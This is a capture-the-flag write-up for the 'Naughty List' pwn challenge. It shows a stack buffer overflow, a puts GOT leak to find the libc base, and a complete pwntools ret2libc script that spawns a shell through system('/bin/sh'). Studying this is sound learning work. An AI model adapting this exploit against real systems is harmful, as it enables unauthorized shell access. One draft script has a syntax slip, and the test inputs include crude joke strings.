# Cyber Santa is Coming to Town (Pwn Naughty List)
This challenge was remarkable because it was one of the simplest and most educative `ret2libc` challenge i've done so far. It was pretty straightforward, finding the vulnerability took me a minute or two, and since they gave me a `libc.so.6` file, i knew it was ret2libc.
## Preparing the Challenge
Before starting the challenge you will need to make sure you have the right version of the linker and the right version of libc, usually you can check the string of the libc binary and search for a ubuntu version then you can run a docker on that right version.
```
$ strings ./libc.so.6 | grep "ubuntu"
GNU C Library (Ubuntu GLIBC 2.27-3ubuntu1.4) stable release version 2.27.
<https://bugs.launchpad.net/ubuntu/+source/glibc/+bugs>.
GCC: (Ubuntu 7.5.0-3ubuntu1~18.04) 7.5.0
```
Looking at the output we can see that our program was compiled using `ubuntu version 18.04`, you can run a docker with that specific version of ubuntu using the following command.
```
$ docker run -it ubuntu:18.04
root@1e005e022242:/#
```

But for this challenge we will use `pwninit`, so i don't have to set up a whole docker environment, as you have probably noticed docker doesn't come with any useful binaries for exploitation, using my main machine will be way much simpler. So you can start by getting `pwninit` using the following command.
```
$ cargo install pwninit
```

Then you can run pwninit in the directory of the vulnerable binary.
```
$ pwninit
bin: ./naughty_list
libc: ./libc.so.6
ld: ./ld-2.27.so

copying ./naughty_list to ./naughty_list_patched
running patchelf on ./naughty_list_patched
```

You can either used the binary `pwninit` generated or patched the binary on your own, you would usually do this with the `patchelf` utility.
```
$ patchelf --set-interpreter ./ld-2.27.so --replace-needed libc.so.6 /challenge/pwn_naughty_list/libc.so.6 ./naughty_list
```

Then you should now be able to run your binary with the right linker and libc versions ! You can verify this by using `ldd` on your binary.
```
$ ldd ./naughty_list
        linux-vdso.so.1 (0x00007ffee7b73000)
        /challenge/pwn_naughty_list/libc.so.6 (0x00007f1c32b1f000)
       ./ld-2.27.so => /usr/lib64/ld-linux-x86-64.so.2 (0x00007f1c32f17000)
```
We can confirm that our  challenge use the right linker and the right libc versions.
## Solving the Challenge
Solving this challenge will be a little longer than the previous writeups i've did so far since ret2libc is a little more complicated. So without hesitating let's solve this challenge.

First thing i will do is find the vulnerable point in the program, i suggest you open the binary in ghidra for that, or you can go in fully 1337 mode and use only gdb. (disassemblers exist for a good reason tho).

Looking at the main function we can see 4 different functions that asks for our input.
![Potentially Vulnerable Functions](https://i.imgur.com/cgUkVpv.png)

Looking deeper into each of these functions we notice that the functions `get_name, get_surname, get_age`. However we do not have any restrictions on our last function `get_descr`.
![No Restrictions on get\_descr input](https://i.imgur.com/GRBbFVq.png)

We can also see in the screenshot that we read `0x3c0 bytes (960)` of input inside a buffer of `32 bytes` which is clearly vulnerable to a buffer overflow.

We can try to make our binary `SEGFAULT` by running it and sending a little more than ~32 bytes of input, let's try this in practice
```
$ ./naughty_list

~ Ho Ho Ho Santa is here ~

       _______________
    0==( Naughty List (c==0
       '______________'|
         | Name        |
         | Gift        |
       __)_____________|
   0==(               (c==0
       '--------------'

[*] Enter your name    (letters only): penis
[*] Enter your surname (letters only): penis
[*] Enter your age (18-120): 69
[+] Name:    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it: AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

[*] 🎅 will take a better look and hopefuly you will get your 🎁!
[1]    3876 segmentation fault (core dumped)  ./naughty_list
```

Running a cyclic string with our binary in gdb reveals that we overwrite our return address after `40 bytes of input`. We can start writing our exploit the following way.
```py
import pwn

e = pwn.ELF("./naughty_list")
libc = pwn.ELF("libc.so.6")
io = pwn.process(e.path)
pwn.context.arch = "amd64"
PADDING = 40
```

Now the second step in a ret2libc attack is to leak the address of a functions in the .got section, this should be pretty simple to do.

Let's start by finding a `pop_rdi; ret` instruction using ropper, so we can align our stack before starting to do a `ropchain`.

```
$ ropper -- --search "pop rdi; ret" --file ./naughty_list
[INFO] Load gadgets from cache
[LOAD] loading... 100%
[LOAD] removing double gadgets... 100%
[INFO] Searching for gadgets: pop rdi

[INFO] File: ./naughty_list
0x0000000000401443: pop rdi; ret;
```

We see that at address `0x0000000000401443`, we have the `pop rdi; ret` instruction. We can take that value and add it into our python script.
```py
pop_rdi = pwn.p64(0x0000000000401443)
```

Sometimes using `ret` instead of `pop rdi; ret` is a better idea, since it's totally doable you can search for a `ret` instruction in the binary and you can add it the same way we just did with `pop_rdi`.

Next thing we need to do is to find a function we want to leak the address of, so what i did was open `bpython or python`, and you can do the following to see the different functions available in the `.got` section.
```
>>> import pwn
>>> e = pwn.ELF("./naughty_list")
[*] '/challenge/pwn_naughty_list/naughty_list'
Arch:     amd64-64-little
RELRO:    Full RELRO
Stack:    No canary found
NX:       NX enabled
PIE:      No PIE (0x3ff000)
>>> e.got
{'__libc_start_main': 6299632, '__gmon_start__': 6299640, 'stdout': 6299744, 'stdin': 6299760, 'toupper': 6299520, '
puts': 6299528, 'strlen': 6299536, 'printf': 6299544, 'memset': 6299552, 'alarm': 6299560, 'read': 6299568, 'srand':
6299576, 'strcmp': 6299584, 'time': 6299592, 'setvbuf': 6299600, '__isoc99_scanf': 6299608, 'fwrite': 6299616, 'ran
d': 6299624}
```
We can notice a few functions we can leak, but for this challenge we will simply use `puts`, so we can continue our script the following way.
```py
puts_at_got = pwn.p64(e.got.puts)
```

And since we want to leak the address of that function we need to get the address of `puts` in the `plt` section, this will cause `puts` to be called with the address of `puts_at_got` as argument (the address of puts in libc), therefore leaking the address on the screen, we can use pwntools to receive the line and to unpack the value. You can add thefollowing to your script.
```py
puts_at_plt = pwn.p64(e.plt.puts)
```
Okay so now we can see if our script is able to leak the address of puts on the screen, your script should look like the following.
```py
import pwn

e = pwn.ELF("./naughty_list")
libc = pwn.ELF("libc.so.6")
io = pwn.process(e.path)
pwn.context.arch = "amd64"
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)

payload = [
    b"A"*PADDING,
    pop_rdi,
    puts_at_got
    puts_at_plt
]

io.sendlineafter(b":", "PENIS")
io.sendlineafter(b":", "PENIS")
io.sendlineafter(b":", "69")

io.sendlineafter(b":", b"".join(payload))

io.interactive()
```

Running the python script confirms that it indeed leaks the address of the puts function.
```
python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4512
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0\xfa\xed3
[*] Got EOF while reading in interactive
```

Leaking the function is cool, but the program directly ends after that since our program don't have any valid instruction to execute, for this reason if we want to exploit the program we will need to make a jump into the vulnerable function `get_descr`. So we're going to add the address of the `get_descr` function after our call to puts in the plt.
```py
get_descr = pwn.p64(e.symbols.get_descr)
```

Don't forget to add the line in the payload field after `puts_at_plt`.
```py
payload = [
    b"A"*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]
```

You can rerun the program, and see that after leaking the address, it jump backs to our vulnerable function.
```
python3 leak.py
[+] Starting local process '/challenge/pwn_naughty_list/naughty_list': pid 4567
[*] Switching to interactive mode
    [PENIS]
[+] Surname: [PENIS]
[+] Age:     [69]

[*] Name of the gift you want and why you were good enough to deserve it:
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
\xa0z֗\xd5

[*] Name of the gift you want and why you were good enough to deserve it: $ test
[*] 🎅 will take a better look and hopefuly you will get your 🎁!
```

Notice how the program asks us a second time for the same vulnerable input, this means we successfully were able to jump back inside our vulnerable function.

Now we need our program to parse the leaked function address, for this we will need to do some trial and error with `recvline` until we have the right number of lines. After testing i know that i need to skip 6 lines before it leaks our input so you can add the following to your script.
```
io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b"\x00"))
pwn.log.info(f"Leaked address {hex(leak)}")
```

Running our script now shows that we indeed leak the `puts` function address properly, and that we were able to store it in a variable called `leak`.

Now to calculate the `libc base address`, we can substract the offset of the `puts` function in libc to the address of `puts` we leaked, this should give us the base address. To find an offset we are going to use the readelf utility.
```
readelf -s ./libc.so.6 | grep GLIBC | grep puts
   191: 0000000000080aa0   512 FUNC    GLOBAL DEFAULT   13 _IO_puts@@GLIBC_2.2.5
   422: 0000000000080aa0   512 FUNC    WEAK   DEFAULT   13 puts@@GLIBC_2.2.5
   496: 0000000000126550  1240 FUNC    GLOBAL DEFAULT   13 putspent@@GLIBC_2.2.5
   678: 0000000000128460   750 FUNC    GLOBAL DEFAULT   13 putsgent@@GLIBC_2.10
   1141: 000000000007f2d0   396 FUNC    WEAK   DEFAULT   13 fputs@@GLIBC_2.2.5
```

We see that the `puts` function as an offset of `0000000000080aa0` in `libc`, let's add the following to our script.
```py
puts_libc_offset = 0x0000000000080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f"Base address of libc : {hex(libc.address)}")
```

Next we can create a `ROP` object and exploit the program using a call to `system("/bin/sh")`, this is pretty simple to do. Add the following to your script. *Note that for an obscure reason, the pop_rdi didn't worked with the second payload, so i used a single ret instead and it worked well*
```py
rop = pwn.ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))
io.sendline(pwn.flat({PADDING: [ret, rop.chain()]}))
```

You should have now the following code in your script.
```py
import pwn

e = pwn.ELF("./naughty_list", checksec=False)
libc = pwn.ELF("libc.so.6", checksec=False)
io = pwn.process(e.path)
pwn.context.arch = "amd64"
PADDING = 40

pop_rdi = pwn.p64(0x0000000000401443)
ret = pwn.p64(0x0000000000400756)
puts_at_got = pwn.p64(e.got.puts)
puts_at_plt = pwn.p64(e.plt.puts)
get_descr = pwn.p64(e.symbols.get_descr)

payload = [
    b"A"*PADDING,
    pop_rdi,
    puts_at_got,
    puts_at_plt,
    get_descr
]

io.sendlineafter(b":", b"PENIS")
io.sendlineafter(b":", b"PENIS")
io.sendlineafter(b":", b"69")
io.sendlineafter(b":", b"".join(payload))

io.recvlines(6)
leak = pwn.unpack(io.recvline()[:6].ljust(8, b"\x00"))
pwn.log.info(f"Leaked address {hex(leak)}")

puts_libc_offset = 0x080aa0
libc.address = leak - puts_libc_offset
pwn.log.info(f"Base address of libc : {hex(libc.address)}")

rop = pwn.ROP(libc)
rop.system(next(libc.search(b"/bin/sh\x00")))
io.sendlineafter(b":", pwn.flat({PADDING: [ret, rop.chain()]}))
io.interactive()
```

Running it either locally or remotely on a vulnerable machine drops us a shell, you can read the flag in the flag.txt file ! Hopefully you enjoyed the challenge and the writeup.
